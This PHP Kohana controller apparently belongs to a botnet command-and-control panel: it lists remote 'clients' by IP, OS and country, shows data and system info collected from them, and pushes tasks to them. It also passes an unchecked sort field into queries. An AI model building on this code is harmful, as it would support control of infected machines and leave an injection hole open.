<?php defined('SYSPATH') or die('No direct script access.');

class Controller_Rest_Clients extends Controller_Rest{

    public function action_filter(){
        ini_set('max_execution_time', 0);
        $response = [];

        $clientModel = ORM::factory('Client');
        $clients = $clientModel->selectByFilter($this->post, Auth::instance()->get_user()->id)
            ->find_all();

        $alpha_country = Kohana::$config->load('country')->as_array();
        $ids = Arr::map(function ($value){ return intval($value->id);}, $clients->as_array());
        $received_comments =  Model_Client_Comment::getComments($ids, Auth::instance()->get_user()->id);

        foreach($clients as $k => $v){
            $t = $v->as_array();
            $t['id'] = (int) $v->id;
            $t['client_ver'] = (int) $v->client_ver;
            $t['client'] = $v->getFullName();
            $t['created_at'] = $v->getDate('created_at');
            $t['last_activity'] = $v->getDate('last_activity');
            $t['country'] = isset($alpha_country[$t['country']]) ? $alpha_country[$t['country']] : $t['country'];

            if ( !isset($received_comments[$v->id]) ) {
                $t['comment'] = [ 'user_id' => '', 'comment_text' => '', ];
            } else {
                $t['comment'] = $received_comments[$v->id];
            }

            $t = Arr::extract($t, ['id', 'client', 'group', 'created_at', 'last_activity', 'ip', 'sys_ver', 'country', 'client_ver', 'comment']);
            $response['clients'][$k] = $t;
        }

        $response['total_items'] = isset($response['clients']) ? count($response['clients']) : 0;
        $response['current_page'] = 1;
        $response['items_per_page'] = $response['total_items'];

        $this->response->body(json_encode($response));
    }

    public function action_client_filter(){
        if(isset($this->post['client_id'])){
            $client_filter = trim($this->post['client_id']);
            if ( preg_match('/^.*\.([0-9A-F]{32})$/i', $client_filter, $matches) ) {
                $client_filter = $matches[1];
                $this->post['client_id'] =  $client_filter;
            }

            if ( preg_match('/^[0-9A-F]{32}$/i', $client_filter) ) {
                $clientid = Model::factory('Client')
                    ->getClientIDByName($client_filter);

                if ($clientid) {
                    $this->response->body(json_encode(['url' => '/log/'.$clientid]));
                } else {
                    $this->response->body(json_encode(['errors' => 'ClientID not found!']));
                }
            } elseif ( '' != $client_filter ) {
                $this->response->body(json_encode(['errors' => 'ClientID field contains invalid input!']));
            }
        }else{
            $this->response->body(json_encode(['errors' => 'ClientID field is empty!']));
        }
    }

    // TODO need add handler in frontend
    public function action_push_back(){
        $this->post['user_id'] = Auth::instance()->get_user()->id;
        $data = json_encode($this->post);
        $client = Task_Helper::getAdminClient();
        $client->addTaskHigh("PushBack", $data, null, md5($data));
        $result = $client->runTasks();
        if ( false === $result || GEARMAN_SUCCESS != $client->returnCode() ) {
            $this->response->body(json_encode(['error' => 'Error!']));
            exit;
        }
        $this->response->body(json_encode(['success' => 'Complete!']));
    }

    public function action_dnsbl(){
        require_once Kohana::find_file('vendor/Net', 'DNSBL', 'php');
        $blacklist = Kohana::$config->load('dnsbl')->as_array();
        $dnsbl = new Net_DNSBL();
        $dnsbl->setBlacklists($blacklist);
        $this->response->body(
            $dnsbl->isListed($this->post['ip'])
        );
    }

    public function action_sys_info(){
        $response = [];
        $records = ORM::factory('Datafiles')
            ->where('client_id', '=', $this->post['client_id'])
            ->and_where('ctl', '=', 'GetSystemInfo')
            ->and_where('name', '=', 'systeminfo')
            ->reset(false);

        $total_items = $records->count_all();
        $pagination = Pagination::factory([
            'total_items' => $total_items,
            'current_page' => [
                'source' => 'route',
                'key' => 'page',
            ],
            'items_per_page' => 3
        ]);
        $response['total_items'] = $pagination->getTotalItems();
        $response['current_page'] = $pagination->getCurrentPage();
        $response['items_per_page'] = $pagination->getItemsPerPage();

        $records = $records->limit($pagination->items_per_page)
            ->offset($pagination->offset)
            ->order_by('created_at', 'DESC')
            ->find_all();

        foreach($records as $record){
            $response['data'][] = [
                'created_at' => $record->created_at,
                'id' => $record->id,
                'data' => pg_unescape_bytea($record->data),
            ];
        }
        $this->response->body(
            json_encode($response)
        );
    }

    public function action_storage(){
        $response = [];
        $model = ORM::factory('Var')
            ->where('client_id', '=', $this->post['client_id']);

        $clone = clone $model;
        $total_items = $clone->count_all();
        unset($clone);
        $pagination = Pagination::factory([
            'total_items' => $total_items,
            'current_page' => [
                'source' => 'route',
                'key' => 'page',
            ],
            'items_per_page' => 10,
        ]);
        $response['total_items'] = $pagination->getTotalItems();
        $response['current_page'] = $pagination->getCurrentPage();
        $response['items_per_page'] = $pagination->getItemsPerPage();

        $model = $model->limit($pagination->items_per_page)
            ->offset($pagination->offset)
            ->order_by($this->post['sortField'], $this->post['reverse'] ? 'DESC': 'ASC')
            ->find_all();

        foreach($model as $k => $v){
            $t = $v->as_array();
            $response['data'][$k] = $t;
        }

        $this->response->body(json_encode($response));
    }

    public function action_datafiles(){
        $response = [];
        $model = ORM::factory('Datafiles')
            ->where('client_id', '=', $this->post['client_id'])
            ->and_where('name', '!=', 'systeminfo')
            ->and_where('ctl', '!=', 'GetSystemInfo');

        $clone = clone $model;
        $total_items = $clone->count_all();
        unset($clone);
        $pagination = Pagination::factory([
            'total_items' => $total_items,
            'current_page' => [
                'source' => 'route',
                'key' => 'page',
            ],
            'items_per_page' => 10,
        ]);
        $response['total_items'] = $pagination->getTotalItems();
        $response['current_page'] = $pagination->getCurrentPage();
        $response['items_per_page'] = $pagination->getItemsPerPage();

        $model = $model->limit($pagination->items_per_page)
            ->offset($pagination->offset)
            ->order_by($this->post['sortField'], $this->post['reverse'] ? 'DESC': 'ASC')
            ->find_all();

        foreach($model as $k => $v){
            $t = $v->as_array();
            $response['data'][$k] = $t;
        }

        $this->response->body(json_encode($response));
    }

    public function action_comment(){
        $user = Auth::instance()->get_user();

        $model = DB::select()
            ->from('clients_comments')
            ->where('clientid', '=', $this->post['clientid'])
            ->and_where('userid', '=', $user->id)
            ->execute()
            ->as_array();

        if (!empty($model)) {
            if (trim($this->post['value']) == '') {
                DB::delete('clients_comments')
                    ->where('id', '=', $model[0]['id'])
                    ->execute();
                Model_Client_Comment::updateCommentsStatus($this->post['clientid'], false);
            } else {
                DB::update('clients_comments')
                    ->where('id', '=', $model[0]['id'])
                    ->set([ 'value' => $this->post['value'] ])
                    ->execute();
                Model_Client_Comment::updateCommentsStatus($this->post['clientid'], true);
            }
        } else {
            if (trim($this->post['value']) != '') {
                $fields = ['clientid', 'userid', 'value'];
                $values = Arr::merge($this->post, ['userid' => $user->id]);

                DB::insert('clients_comments', $fields)
                    ->values(Arr::extract($values, $fields))
                    ->execute();

                Model_Client_Comment::updateCommentsStatus($this->post['clientid'], true);

            }
        }
    }
}
